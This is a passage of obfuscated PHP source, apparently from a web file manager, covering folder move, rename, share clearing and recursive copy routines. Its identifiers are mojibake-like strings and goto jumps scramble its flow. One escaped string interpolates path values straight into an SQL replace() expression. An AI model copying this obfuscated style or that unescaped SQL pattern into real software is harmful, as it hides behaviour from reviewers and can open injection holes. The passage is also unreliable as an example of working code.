array($E‘ü∏ÛÁ§Ó[457] => $eë‹‚˜ê‹¥, $E‘ü∏ÛÁ§Ó[393] => $this->targetIsDelete); $b‘”»¢“ä∂ = $this->where($d£É¨ó¯ÑÏ)->select(); goto fò¨≤ª∫äÙ; fò¨≤ª∫äÙ: $b‘”»¢“ä∂ = $b‘”»¢“ä∂ ? $b‘”»¢“ä∂ : array(); $BÉÙ≠™Ç∆ﬁ = array_to_keyvalue($b‘”»¢“ä∂, $E‘ü∏ÛÁ§Ó[365]); $this->_childrenListCache[$eë‹‚˜ê‹¥] = $BÉÙ≠™Ç∆ﬁ; goto fö¥œ–—œÕ; fö¥œ–—œÕ: foreach ($BÉÙ≠™Ç∆ﬁ as $eë‹‚˜ê‹¥ => $c“ÏÆ≠¢Çì) { $this->_childrenItemCache[$eë‹‚˜ê‹¥] = $c“ÏÆ≠¢Çì; } return $BÉÙ≠™Ç∆ﬁ; goto C…Ÿ‡äèŒª; C…Ÿ‡äèŒª: } private function fileNameExistCache($c§ﬂÜŸÜ®Õ, $Fâ“Œø˜†˜) { $Eïƒ°™ùèº =& $_SERVER[¯èãÄπµ]; $Fâ“Œø˜†˜ = strtolower($Fâ“Œø˜†˜); $bèàòÿÇÔÇ = $this->_childrenList($c§ﬂÜŸÜ®Õ); foreach ($bèàòÿÇÔÇ as $F√ê≠ΩŒŸ ) { if ($Fâ“Œø˜†˜ == strtolower($F√ê≠ΩŒŸ [$Eïƒ°™ùèº[28]])) { return $F√ê≠ΩŒŸ [$Eïƒ°™ùèº[365]]; } } return !1; } private function fileNameAutoCache($f†ã«–õÉÂ, $bÜã÷‰‚⁄–, $fã®ËÚÊ¡™, $FÖ∫“åü©è) { $d◊œ ¿ïàÇ =& $_SERVER[¯èãÄπµ]; $BÔæÂÖˆò‰ = $this->_childrenList($f†ã«–õÉÂ); $eÎ‚∏ÜÇ®¡ = array_to_keyvalue($BÔæÂÖˆò‰, $d◊œ ¿ïàÇ[33], $d◊œ ¿ïàÇ[28]); return $this->fileNameAutoGet($eÎ‚∏ÜÇ®¡, $bÜã÷‰‚⁄–, $fã®ËÚÊ¡™, $FÖ∫“åü©è); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($a∆çØ ÂöÏ, $cöèÖÕËﬂã, $b‚¿úëœ…ü = REPEAT_REPLACE, $AÇ∑ä“ù‚Ï = '') { goto E¢π¿⁄∫±ò; E¢π¿⁄∫±ò: $DÎ∫Ïæ—œ≥ =& $_SERVER[¯èãÄπµ]; $Dûπê‚«¨® = $this->sourceInfo($a∆çØ ÂöÏ); $C·ä©©Œñ¥ = $this->sourceInfo($cöèÖÕËﬂã); goto eá–ÿñÇäß; a∂–ªñò°¶: $dõËã‹ññ⁄ = array($DÎ∫Ïæ—œ≥[497] => array(), $DÎ∫Ïæ—œ≥[529] => !1); $this->clearShare($a∆çØ ÂöÏ, $cöèÖÕËﬂã); $dÒôòﬂçñà = $this->fileNameExistCache($cöèÖÕËﬂã, $Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[28]]); goto eë˘Áøıø≥; FÕŒãã¡àí: $this->lockWriteEnd($cöèÖÕËﬂã, $Eêáã©ø—˘); $this->folderSizeReset($Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[457]]); $this->folderSizeReset($cöèÖÕËﬂã); goto F˘á¬”…êÁ; eá–ÿñÇäß: $Aˆ Œêã´‚ = $this->pathInfoMore($a∆çØ ÂöÏ); if ($this->isParentOf($a∆çØ ÂöÏ, $cöèÖÕËﬂã)) { return !1; } if (!$Dûπê‚«¨® || !$C·ä©©Œñ¥ || $C·ä©©Œñ¥[$DÎ∫Ïæ—œ≥[366]] != $DÎ∫Ïæ—œ≥[83]) { return !1; } goto d˘›È‚™ˆ±; eë˘Áøıø≥: $D¿öﬁÊû≤“ = $this->_move($a∆çØ ÂöÏ, $cöèÖÕËﬂã, $b‚¿úëœ…ü, $dõËã‹ññ⁄, $AÇ∑ä“ù‚Ï); $this->sourceCacheClear(); if ($Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[366]] == $DÎ∫Ïæ—œ≥[83] && $dÒôòﬂçñà) { $this->folderSizeResetChildren($D¿öﬁÊû≤“); } goto Cá™ÖÔó›ï; Cá™ÖÔó›ï: Model($DÎ∫Ïæ—œ≥[163])->linkAdd($dõËã‹ññ⁄[$DÎ∫Ïæ—œ≥[497]]); if ($dÒôòﬂçñà && $dõËã‹ññ⁄[$DÎ∫Ïæ—œ≥[529]]) { $this->removeNow($a∆çØ ÂöÏ, !1); } $this->lockMoveEnd($a∆çØ ÂöÏ); goto FÕŒãã¡àí; d˘›È‚™ˆ±: Hook::trigger($DÎ∫Ïæ—œ≥[527], $Aˆ Œêã´‚); $this->targetIsDelete = intval($Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[393]]); if ($Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[457]] == $cöèÖÕËﬂã && $AÇ∑ä“ù‚Ï != $Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[28]]) { $bëïÎÌïÃ£ = $this->fileNameExist($cöèÖÕËﬂã, $AÇ∑ä“ù‚Ï); if ($bëïÎÌïÃ£ && $Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[366]] == $DÎ∫Ïæ—œ≥[464]) { goto CèÇ≠·äÛç; D“‹»∫»û’: $this->removeNow($a∆çØ ÂöÏ, !1); $this->folderSizeReset($cöèÖÕËﬂã); Hook::trigger($DÎ∫Ïæ—œ≥[528], $Aˆ Œêã´‚); goto cΩÇ°◊⁄ñ¶; cΩÇ°◊⁄ñ¶: return $bëïÎÌïÃ£; goto B«É˜Ï¶å¨; CèÇ≠·äÛç: $f¿ú“Ûí°º = $this->sourceInfo($bëïÎÌïÃ£); $aÃ˜⁄¥å«£ = $this->fileHistory($f¿ú“Ûí°º, $Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[415]], $Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[77]]); if (!$aÃ˜⁄¥å«£) { Model($DÎ∫Ïæ—œ≥[418])->remove($Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[415]]); } goto D“‹»∫»û’; B«É˜Ï¶å¨: } } goto D∂öØÛ–Ç≤; F˘á¬”…êÁ: $cØÎæç¥ã® = array($Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[457]], $cöèÖÕËﬂã); if ($Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[366]] == $DÎ∫Ïæ—œ≥[83]) { $cØÎæç¥ã®[] = $a∆çØ ÂöÏ; } $this->updateModifyTime($cØÎæç¥ã®); goto FŸÀŸ¬†æÎ; D∂öØÛ–Ç≤: $Eêáã©ø—˘ = $AÇ∑ä“ù‚Ï ? $AÇ∑ä“ù‚Ï : $Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[28]]; $this->lockMoveStart($a∆çØ ÂöÏ); $this->lockWriteStart($cöèÖÕËﬂã, $Eêáã©ø—˘); goto a∂–ªñò°¶; FŸÀŸ¬†æÎ: Model($DÎ∫Ïæ—œ≥[501])->eventMove($a∆çØ ÂöÏ, $Dûπê‚«¨®[$DÎ∫Ïæ—œ≥[457]], $cöèÖÕËﬂã); Hook::trigger($DÎ∫Ïæ—œ≥[528], $Aˆ Œêã´‚); return $D¿öﬁÊû≤“; goto fﬁ∫àë©Æ†; fﬁ∫àë©Æ†: } private function _move($Dï˜“© É´, $f¨ùÛúµà›, $fÒ±È≠Êä§, &$bÑÊîÇ’Éü, $eÕΩŒ˜›‚˘ = '') { goto fãêÜ–‡œ‘; EÎçéØøãÎ: $this->lockWriteStart($f¨ùÛúµà›, $bÔóªà¢’◊); if (!$aÆ°∞ßëˆå) { return $this->_moveForce($Dï˜“© É´, $f¨ùÛúµà›, $bÔóªà¢’◊); } $F‰ñØÕ‡É⁄ = $aÆ°∞ßëˆå; goto Bô‡°ö∆ôø; Bô‡°ö∆ôø: $DåÛàÙä∞‹ = !1; if ($eÛﬂëËâ“ﬁ) { if ($fÒ±È≠Êä§ == REPEAT_RENAME_FOLDER) { $bÔóªà¢’◊ = $this->fileNameAuto($f¨ùÛúµà›, $bÔóªà¢’◊, $fÒ±È≠Êä§, $eÛﬂëËâ“ﬁ); $F‰ñØÕ‡É⁄ = $this->_moveForce($Dï˜“© É´, $f¨ùÛúµà›, $bÔóªà¢’◊); } else { if ($fÒ±È≠Êä§ == REPEAT_RENAME_FOLDER) { $fÒ±È≠Êä§ = REPEAT_RENAME; } $E∏°ä¢ÈŸÓ = $this->_childrenListSelect($Dï˜“© É´); foreach ($E∏°ä¢ÈŸÓ as $D¯≥…ÎŸö) { $this->_move($D¯≥…ÎŸö[$cËç‘ÍÔÇ∏[365]], $aÆ°∞ßëˆå, $fÒ±È≠Êä§, $bÑÊîÇ’Éü); } $DåÛàÙä∞‹ = !0; } } else { if ($fÒ±È≠Êä§ == REPEAT_SKIP) { $DåÛàÙä∞‹ = !0; } else { if ($fÒ±È≠Êä§ == REPEAT_RENAME || $fÒ±È≠Êä§ == REPEAT_RENAME_FOLDER) { $bÔóªà¢’◊ = $this->fileNameAuto($f¨ùÛúµà›, $bÔóªà¢’◊, $fÒ±È≠Êä§, $eÛﬂëËâ“ﬁ); $F‰ñØÕ‡É⁄ = $this->_moveForce($Dï˜“© É´, $f¨ùÛúµà›, $bÔóªà¢’◊); } else { if ($fÒ±È≠Êä§ == REPEAT_REPLACE) { $bî•Œœ€›— = $this->sourceInfoCache($aÆ°∞ßëˆå); $d„Ïç∏ºÕ® = $this->fileHistory($bî•Œœ€›—, $a◊ôÑ’ì¶”[$cËç‘ÍÔÇ∏[415]], $a◊ôÑ’ì¶”[$cËç‘ÍÔÇ∏[77]]); if ($d„Ïç∏ºÕ®) { $bÑÊîÇ’Éü[$cËç‘ÍÔÇ∏[497]][] = $a◊ôÑ’ì¶”[$cËç‘ÍÔÇ∏[415]]; } else { $DåÛàÙä∞‹ = !0; } } } } } if ($DåÛàÙä∞‹ && !$bÑÊîÇ’Éü[$cËç‘ÍÔÇ∏[529]]) { $bÑÊîÇ’Éü[$cËç‘ÍÔÇ∏[529]] = !0; } goto a‘≠îÀ‹©ê; AàÊªëçÿŸ: $bÔóªà¢’◊ = $eÕΩŒ˜›‚˘ ? $eÕΩŒ˜›‚˘ : $a◊ôÑ’ì¶”[$cËç‘ÍÔÇ∏[28]]; $aÆ°∞ßëˆå = $this->fileNameExistCache($f¨ùÛúµà›, $bÔóªà¢’◊); $this->lockMoveStart($Dï˜“© É´); goto EÎçéØøãÎ; fãêÜ–‡œ‘: $cËç‘ÍÔÇ∏ =& $_SERVER[¯èãÄπµ]; $a◊ôÑ’ì¶” = $this->sourceInfo($Dï˜“© É´); $eÛﬂëËâ“ﬁ = $a◊ôÑ’ì¶”[$cËç‘ÍÔÇ∏[366]] == $cËç‘ÍÔÇ∏[83]; goto AàÊªëçÿŸ; a‘≠îÀ‹©ê: return $F‰ñØÕ‡É⁄; goto Aª„¢ëå“æ; Aª„¢ëå“æ: } private function _moveForce($aâèÌï•ñ™, $f“≤Ë§ÑÍå, $d¬¶Èôõ¡É) { goto CßË…”ä¶; Bﬁ¬ì§ ò≤: $Eó…≠«çÎÀ = $DÈ›µ¶€˜Û[$F¿ç∞◊ñ√ì[366]] == $F¿ç∞◊ñ√ì[83]; $Cé´Ò–‹ìÏ = array($F¿ç∞◊ñ√ì[364] => $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[365]], $F¿ç∞◊ñ√ì[521] => $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[455]] . $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[365]] . $F¿ç∞◊ñ√ì[47], $F¿ç∞◊ñ√ì[517] => $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[367]], $F¿ç∞◊ñ√ì[518] => $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[452]], $F¿ç∞◊ñ√ì[520] => USER_ID, $F¿ç∞◊ñ√ì[382] => $d¬¶Èôõ¡É); $a≈Ñ±Ö…È¢ = $DÈ›µ¶€˜Û[$F¿ç∞◊ñ√ì[367]] == SourceModel::TYPE_GROUP && $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[367]] == SourceModel::TYPE_GROUP && $DÈ›µ¶€˜Û[$F¿ç∞◊ñ√ì[452]] == $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[452]]; goto b¿ÎÖ» ´≥; d≥∂‘·§‘±: if ($Eó…≠«çÎÀ) { $DÒù§ûº≠ = array($F¿ç∞◊ñ√ì[521] => array($F¿ç∞◊ñ√ì[479], $DÈ›µ¶€˜Û[$F¿ç∞◊ñ√ì[455]] . $DÈ›µ¶€˜Û[$F¿ç∞◊ñ√ì[365]] . $F¿ç∞◊ñ√ì[480])); $D¡⁄£’’ó˜ = $DÈ›µ¶€˜Û[$F¿ç∞◊ñ√ì[455]] . $DÈ›µ¶€˜Û[$F¿ç∞◊ñ√ì[365]] . $F¿ç∞◊ñ√ì[47]; $Aß◊î¢©‹î = $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[455]] . $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[365]] . $F¿ç∞◊ñ√ì[47] . $DÈ›µ¶€˜Û[$F¿ç∞◊ñ√ì[365]] . $F¿ç∞◊ñ√ì[47]; $fÈ∂ã’Íñπ = array($F¿ç∞◊ñ√ì[521] => array($F¿ç∞◊ñ√ì[530], "\162\145\160\x6c\141\143\x65\x28\160\x61\162\145\x6e\164\x4c\145\x76\145\154\54\47{$D¡⁄£’’ó˜}\47\54\47{$Aß◊î¢©‹î}\47\x29"), $F¿ç∞◊ñ√ì[517] => $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[367]], $F¿ç∞◊ñ√ì[518] => $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[452]]); if ($Açá€±«È‰) { $fÈ∂ã’Íñπ[$F¿ç∞◊ñ√ì[392]] = 0; } $this->where($DÒù§ûº≠)->data($fÈ∂ã’Íñπ)->save(); } $this->where(array($F¿ç∞◊ñ√ì[379] => $aâèÌï•ñ™))->data($Cé´Ò–‹ìÏ)->save(); return $aâèÌï•ñ™; goto d®øíÜÀƒπ; CßË…”ä¶: $F¿ç∞◊ñ√ì =& $_SERVER[¯èãÄπµ]; $DÈ›µ¶€˜Û = $this->sourceInfo($aâèÌï•ñ™); $a≈Õπ∆å—‰ = $this->sourceInfo($f“≤Ë§ÑÍå); goto Bﬁ¬ì§ ò≤; b¿ÎÖ» ´≥: if (!$a≈Ñ±Ö…È¢) { Model($F¿ç∞◊ñ√ì[450])->authClear($aâèÌï•ñ™); } $Açá€±«È‰ = $DÈ›µ¶€˜Û[$F¿ç∞◊ñ√ì[393]] == $F¿ç∞◊ñ√ì[83] && $a≈Õπ∆å—‰[$F¿ç∞◊ñ√ì[393]] != $F¿ç∞◊ñ√ì[83]; if ($Açá€±«È‰) { $Cé´Ò–‹ìÏ[$F¿ç∞◊ñ√ì[392]] = 0; } goto d≥∂‘·§‘±; d®øíÜÀƒπ: } private function clearShare($Cçæ∞´∂æ, $e‡€ËÆ“Ó) { goto c¯êèÚºÊÂ; c¯êèÚºÊÂ: $aëÁπü∂∆ë =& $_SERVER[¯èãÄπµ]; $E¢Ñì¥â∏» = $this->sourceInfo($Cçæ∞´∂æ); $FÈÇ…ﬁò⁄® = $this->sourceInfo($e‡€ËÆ“Ó); goto BıÃÆéπÊƒ; Aüœı∏ƒñ“: if (!$cµ—∫ÖÏÉÒ) { return; } $FÇä±û’ºÂ = array($aëÁπü∂∆ë[365] => array($aëÁπü∂∆ë[7], $cµ—∫ÖÏÉÒ), $aëÁπü∂∆ë[444] => 1); $E∑ê∏¢Æ§¶ = Model($aëÁπü∂∆ë[532])->field($aëÁπü∂∆ë[437])->where($FÇä±û’ºÂ)->select(); goto dŒƒÑ‡Ÿ…; BıÃÆéπÊƒ: if ($E¢Ñì¥â∏»[$aëÁπü∂∆ë[452]] == $FÈÇ…ﬁò⁄®[$aëÁπü∂∆ë[452]] && $E¢Ñì¥â∏»[$aëÁπü∂∆ë[367]] == $aëÁπü∂∆ë[531]) { return; } $FÇä±û’ºÂ = array($aëÁπü∂∆ë[455] => array($aëÁπü∂∆ë[479], $E¢Ñì¥â∏»[$aëÁπü∂∆ë[455]] . $Cçæ∞´∂æ . $aëÁπü∂∆ë[480])); $cµ—∫ÖÏÉÒ = $this->field($aëÁπü∂∆ë[379])->where($FÇä±û’ºÂ)->getField($aëÁπü∂∆ë[365], !0); goto Aüœı∏ƒñ“; dŒƒÑ‡Ÿ…: if (!$E∑ê∏¢Æ§¶) { return; } $E∑ê∏¢Æ§¶ = array_to_keyvalue($E∑ê∏¢Æ§¶, $aëÁπü∂∆ë[33], $aëÁπü∂∆ë[437]); $FÇä±û’ºÂ = array($aëÁπü∂∆ë[437] => array($aëÁπü∂∆ë[7], $E∑ê∏¢Æ§¶)); goto E€§ÕÚ≤É∞; E€§ÕÚ≤É∞: Model($aëÁπü∂∆ë[532])->where($FÇä±û’ºÂ)->save(array($aëÁπü∂∆ë[444] => 0)); Model($aëÁπü∂∆ë[533])->where($FÇä±û’ºÂ)->delete(); goto eï˜Ú»ØÀ«; eï˜Ú»ØÀ«: } public function copyFolderFromIO($C°™¨‡÷Ù, $DòîÛù⁄«Ü, $e◊¬…ñ≤ùÎ, $f‹±Éõ≥úÙ, $f ∞üÉô∏ˆ, $E´ƒ◊˜Ìáä = false) { goto Bå∆úÌ…ﬁÛ; F„ªã›œÃ˜: Hook::trigger($cÃﬂû·•◊∂[536]); if ($cë∑‡ôÉ‡ç) { $this->folderSizeResetChildren($cë∑‡ôÉ‡ç); } $this->_childrenListClear(); goto DÀãûÿ–¿≤; DÀãûÿ–¿≤: Model($cÃﬂû·•◊∂[500])->addAll($aÀ§¢ﬁ∞µ¨[$cÃﬂû·•◊∂[498]], array(), !0); Model($cÃﬂû·•◊∂[501])->eventCopy($cë∑‡ôÉ‡ç); $this->saveAll($aÀ§¢ﬁ∞µ¨[$cÃﬂû·•◊∂[499]]); goto a––πèÇ‰∑; dîÁ¥‡Í»±: $BÈ˘ÔôÇÚú = $this->fileNameExist($e◊¬…ñ≤ùÎ, $F™ÉÁ≠Û…); $cë∑‡ôÉ‡ç = $this->mkdir($e◊¬…ñ≤ùÎ, $F™ÉÁ≠Û…, $f‹±Éõ≥úÙ); if (!$BÈ˘ÔôÇÚú || $f‹±Éõ≥úÙ == REPEAT_RENAME_FOLDER) { $f‹±Éõ≥úÙ = !1; } goto E∞®”„ ç; Bå∆úÌ…ﬁÛ: $cÃﬂû·•◊∂ =& $_SERVER[¯èãÄπµ]; $aÀ§¢ﬁ∞µ¨ = array($cÃﬂû·•◊∂[498] => array(), $cÃﬂû·•◊∂[499] => array(), $cÃﬂû·•◊∂[497] => array(), $cÃﬂû·•◊∂[534] => array()); $F™ÉÁ≠Û… = $E´ƒ◊˜Ìáä ? $E´ƒ◊˜Ìáä : $C°™¨‡÷Ù->getPathName($C°™¨‡÷Ù->pathThis($DòîÛù⁄«Ü)); goto dîÁ¥‡Í»±; a––πèÇ‰∑: Model($cÃﬂû·•◊∂[418])->linkAdd($aÀ§¢ﬁ∞µ¨[$cÃﬂû·•◊∂[497]]); Model($cÃﬂû·•◊∂[418])->remove($aÀ§¢ﬁ∞µ¨[$cÃﬂû·•◊∂[534]]); $this->folderSizeReset($e◊¬…ñ≤ùÎ); goto fÔåÇ›»—°; fÔåÇ›»—°: $this->updateModifyTime($e◊¬…ñ≤ùÎ); return $cë∑‡ôÉ‡ç; goto Fáí‰Ëò∆ı; E∞®”„ ç: if ($BÈ˘ÔôÇÚú) { $this->_childrenAllMake($BÈ˘ÔôÇÚú); } Hook::trigger($cÃﬂû·•◊∂[535]); $this->_copyChildTo($C°™¨‡÷Ù, $DòîÛù⁄«Ü, $cë∑‡ôÉ‡ç, $f‹±Éõ≥úÙ, $aÀ§¢ﬁ∞µ¨, $f ∞üÉô∏ˆ); goto F„ªã›œÃ˜; Fáí‰Ëò∆ı: } private function _copyChildTo($A◊Ñ≠ëıµè, $AÇòÈ¿ëÚˆ, $d¥Í∂¯”ﬁú, $fä—èãÓÑµ, &$bêüè…Ø¥›, $f—ï´•ì†Ÿ) { goto e≤è¬ÓÂ¡Ω; e≤è¬ÓÂ¡Ω: $CáÖâ÷´˜Æ =& $_SERVER[¯èãÄπµ]; $dë±†È®ˆ∆ = $this->sourceInfoCache($d¥Í∂¯”ﬁú); $EßÙ’≈äÚ√ = $A◊Ñ≠ëıµè->listPath($AÇòÈ¿ëÚˆ, !1, !0); goto dÚ≥ŒΩüà; F€Ñ•Õ€’√: foreach ($CÛ¿¶ﬂ“òå as &$A»–Ù¶∏Ï—) { goto Aíâˆìœº; Aíâˆìœº: if (isset($b¿˜√ø—Ô‰[$A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[28]]])) { $A»–Ù¶∏Ï— = $b¿˜√ø—Ô‰[$A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[28]]]; } $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[366]] = $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[29]] == $CáÖâ÷´˜Æ[76]; $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[368]] = _get($A»–Ù¶∏Ï—, $CáÖâ÷´˜Æ[156], $CáÖâ÷´˜Æ[33]); goto e÷úÂ¯˘Âá; e÷úÂ¯˘Âá: $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[77]] = _get($A»–Ù¶∏Ï—, $CáÖâ÷´˜Æ[77], 0); $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[415]] = _get($A»–Ù¶∏Ï—, $CáÖâ÷´˜Æ[415], 0); if (!isset($A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[537]]) && $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[415]]) { $bêüè…Ø¥›[$CáÖâ÷´˜Æ[534]][] = $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[415]]; } goto Bπù´ëŒŒê; Bπù´ëŒŒê: if ($fä—èãÓÑµ) { $Dˆ‹ÆòÜçó = $this->fileNameExistCache($d¥Í∂¯”ﬁú, $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[28]]); if ($Dˆ‹ÆòÜçó) { if ($A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[366]] || $fä—èãÓÑµ == REPEAT_SKIP) { continue; } if ($fä—èãÓÑµ == REPEAT_REPLACE) { $E˘≥ÒÔ≈Ñ¿ = $this->sourceInfoCache($Dˆ‹ÆòÜçó); $aÊ˜–•ñøí = $this->fileHistory($E˘≥ÒÔ≈Ñ¿, $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[415]], $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[77]]); if ($aÊ˜–•ñøí) { $bêüè…Ø¥›[$CáÖâ÷´˜Æ[497]][] = $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[415]]; } continue; } else { if ($fä—èãÓÑµ == REPEAT_RENAME) { $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[28]] = $this->fileNameAutoCache($d¥Í∂¯”ﬁú, $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[28]], $fä—èãÓÑµ, !1); } } } } if (!$A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[366]] && $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[415]]) { $bêüè…Ø¥›[$CáÖâ÷´˜Æ[497]][] = $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[415]]; } $cûåöû‰ÂÈ[] = $this->_makeItemData($A»–Ù¶∏Ï—, $dë±†È®ˆ∆, $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[28]]); goto f•’À¿âªõ; f•’À¿âªõ: } unset($A»–Ù¶∏Ï—); if (!empty($cûåöû‰ÂÈ)) { $this->addAll($cûåöû‰ÂÈ); } goto cÀ⁄®∑≥üæ; cÀ⁄®∑≥üæ: $f∆å™®°ıû = $this->_childrenList($d¥Í∂¯”ﬁú); $f∆å™®°ıû = array_to_keyvalue($f∆å™®°ıû, $CáÖâ÷´˜Æ[28]); foreach ($CÛ¿¶ﬂ“òå as $A»–Ù¶∏Ï—) { $E˘≥ÒÔ≈Ñ¿ = $f∆å™®°ıû[$A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[28]]]; $f≤¡ÌáËç = $E˘≥ÒÔ≈Ñ¿[$CáÖâ÷´˜Æ[365]]; $this->_copyApplyMeta($E˘≥ÒÔ≈Ñ¿, $bêüè…Ø¥›); if ($A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[29]] == $CáÖâ÷´˜Æ[76]) { $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[75]] = $A◊Ñ≠ëıµè->getPathInner($A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[75]]); $this->_copyChildTo($A◊Ñ≠ëıµè, $A»–Ù¶∏Ï—[$CáÖâ÷´˜Æ[75]], $f≤¡ÌáËç, $fä—èãÓÑµ, $bêüè…Ø¥›, $f—ï´•ì†Ÿ); } } goto D®äÛÆôåŸ; dÚ≥ŒΩüà: $CÛ¿¶ﬂ“òå = array_merge($EßÙ’≈äÚ√[$CáÖâ÷´˜Æ[73]], $EßÙ’≈äÚ√[$CáÖâ÷´˜Æ[74]]); $b¿˜√ø—Ô‰ = $this->_addFiles($A◊Ñ≠ëıµè, $EßÙ’≈äÚ√[$CáÖâ÷´˜Æ[73]], $f—ï´•ì†Ÿ); $cûåöû‰ÂÈ = array(); goto F€Ñ•Õ€’√; D®äÛÆôåŸ: } private function _addFiles($cÎÀ≤ıâÜÈ, $b‰¥ò¿É§æ, $cŒ–Ú√È≈≤) { goto F§â∞Ωû¶≥; f¬”èê¢Àã: return $c´…›∞¬ÏË; goto d…·Úˆ†õæ; C∞›»‹‡Éë: $F¥§öõ·—• = $e—∞ûãÈ≤ê->where($b·Æ’õ‹”)->select(); $F¥§öõ·—• = $F¥§öõ·—• ? $F¥§öõ·—• : array(); foreach ($F¥§öõ·—• as $A±“›É‡∑Ì) { if (!isset($aƒñÜÙÒ§≈[$A±“›É‡∑Ì[$C¢Ÿ—¿≠„©[159]]])) { continue; } $B¥âº∂ØÂÿ = $aƒñÜÙÒ§≈[$A±“›É‡∑Ì[$C¢Ÿ—¿≠„©[159]]]; foreach ($B¥âº∂ØÂÿ as &$e¶÷«ÖåØ…) { $e¶÷«ÖåØ…[$C¢Ÿ—¿≠„©[415]] = $A±“›É‡∑Ì[$C¢Ÿ—¿≠„©[415]]; $e¶÷«ÖåØ…[$C¢Ÿ—¿≠„©[537]] = !0; } unset($e¶÷«ÖåØ…); } goto cå‚∆≈≥˜â; aÍÕÒı∂ïé: foreach ($F¥§öõ·—• as $A±“›É‡∑Ì) { if (!isset($aƒñÜÙÒ§≈[$A±“›É‡∑Ì[$C¢Ÿ—¿≠„©[159]]])) { continue; } $eÉÏ≈Ï …≥ =& $aƒñÜÙÒ§≈[$A±“›É‡∑Ì[$C¢Ÿ—¿≠„©[159]]]; foreach ($eÉÏ≈Ï …≥ as &$e¶÷«ÖåØ…) { $e¶÷«ÖåØ…[$C¢Ÿ—¿≠„©[415]] = $A±“›É‡∑Ì[$C¢Ÿ—¿≠„©[415]]; } unset($e¶÷«ÖåØ…); } $c´…›∞¬ÏË = array(); foreach ($b‰¥ò¿É§æ as $EÏ’ÂìÎâÆ) { $c´…›∞¬ÏË[$EÏ’ÂìÎâÆ[$C¢Ÿ—¿≠„©[28]]] = $EÏ’ÂìÎâÆ; } goto f¬”èê¢Àã; F§â∞Ωû¶≥: $C¢Ÿ—¿≠„© =& $_SERVER[¯èãÄπµ]; if (!$b‰¥ò¿É§æ || count($b‰¥ò¿É§æ) == 0) { return array(); } $aƒñÜÙÒ§≈ = array(); goto D†º¶—ô•·; cå‚∆≈≥˜â: $BµÉíπµºá = array(); foreach ($b‰¥ò¿É§æ as $AÖ»ûÉØÿ) { if (isset($AÖ»ûÉØÿ[$C¢Ÿ—¿≠„©[537]]) && $AÖ»ûÉØÿ[$C¢Ÿ—¿≠„©[537]]) { continue; } $eññÙª›—‡ = $cÎÀ≤ıâÜÈ->getPathInner($AÖ»ûÉØÿ[$C¢Ÿ—¿≠„©[75]]); $dÉñ≈Õ˘ãñ = $e—∞ûãÈ≤ê->addFileMake($eññÙª›—‡, $AÖ»ûÉØÿ[$C¢Ÿ—¿≠„©[77]], $AÖ»ûÉØÿ[$C¢Ÿ—¿≠„©[160]], $AÖ»ûÉØÿ[$C¢Ÿ—¿≠„©[159]], $AÖ»ûÉØÿ[$C¢Ÿ—¿≠„©[28]], $cŒ–Ú√È≈≤); $BµÉíπµºá[] = $dÉñ≈Õ˘ãñ; } $e—∞ûãÈ≤ê->addAll($BµÉíπµºá); goto d£‘˘®ÿ◊®; D†º¶—ô•·: foreach ($b‰¥ò¿É§æ as &$e¶÷«ÖåØ…) { goto bÖ”ßªŒò®; bÖ”ßªŒò®: Hook::trigger($C¢Ÿ—¿≠„©[538], $e¶÷«ÖåØ…); $e¶÷«ÖåØ…[$C¢Ÿ—¿≠„©[75]] = $cÎÀ≤ıâÜÈ->getPathInner($e¶÷«ÖåØ…[$C¢Ÿ—¿≠„©[75]]); $cœîâ’Ò¨Î = $cÎÀ≤ıâÜÈ->hashSimple($e¶÷«ÖåØ…[$C¢Ÿ—¿≠„©[75]]); goto DŒ§∞Ç˘Â¡; DŒ§∞Ç˘Â¡: $B–“™åò÷» = 